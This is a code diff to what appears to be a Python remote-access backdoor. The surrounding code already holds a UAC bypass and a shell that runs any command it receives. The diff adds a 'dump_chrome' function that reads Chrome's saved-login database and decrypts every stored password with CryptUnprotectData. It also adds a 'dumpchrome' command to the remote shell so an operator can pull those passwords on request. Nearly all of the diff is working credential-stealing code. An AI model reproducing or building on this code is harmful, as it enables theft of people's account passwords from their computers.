@@ -14,6 +14,8 @@ import hashlib
 import ctypes
 import getpass
 import sys
+import win32crypt
+import sqlite3
 
 if os.name == "nt":
 	import win32net
@@ -271,10 +273,67 @@ class Privilege_Escalation:
 		logging.debug(execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f"))
 		return "BG_NEW_SESH"
 		
+class Information_Gathering:
+	"""
+	Functions related to gathering data from the system.
+	"""
+	@windows_only
+	def dump_chrome(self):
+		info_list = []
+		path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
+		original_dir = os.getcwd()
+		try:
+			os.chdir(path)
+		except:
+			return("Chrome is not installed.")
+		try:
+			connection = sqlite3.connect("Login Data")
+			with connection:
+				cursor = connection.cursor()
+				v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+				value = v.fetchall()
+			for information in value:
+				if os.name == 'nt':
+					password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
+					if password:
+						info_list.append({
+							'origin_url': information[0],
+							'username': information[1],
+							'password': str(password)
+						})
+			output = ""
+			for val in info_list:
+				for key in val:
+					if key == "origin_url":
+						wsite = val[key]
+					elif key == "username":
+						uname = val[key]
+					elif key == "password":
+						pword = val[key]
+				formatted = "Website:  "+wsite+"\nUsername: "+uname+"\nPassword: "+pword+"\n\n"
+				output += str(formatted)
+
+		except sqlite3.OperationalError, e:
+				e = str(e)
+				if (e == 'database is locked'):
+					return "[-]Database is locked. Is Chrome running?"
+				elif (e == 'no such table: logins'):
+					return "[-]Logins table is not present in the database."
+				elif (e == 'unable to open database file'):
+					return "[-]Database file does not exist."
+				else:
+					return "[-]Unknown error"
+		
+		os.chdir(original_dir)
+		return output
+		
+	
+		
 execute = Execute()
 fs = Filesystem()
 misc = Miscellaneous()
 privesc = Privilege_Escalation()
+info = Information_Gathering()
 	
 class Shell:
 	"""
@@ -298,6 +357,8 @@ class Shell:
 				output = str(misc.isadmin())
 			elif data == "bypassuac":
 				output = privesc.bypass_uac()
+			elif data == "dumpchrome":
+				output = info.dump_chrome()
 			else:
 				output = execute.execute_shell_command(data)
 				
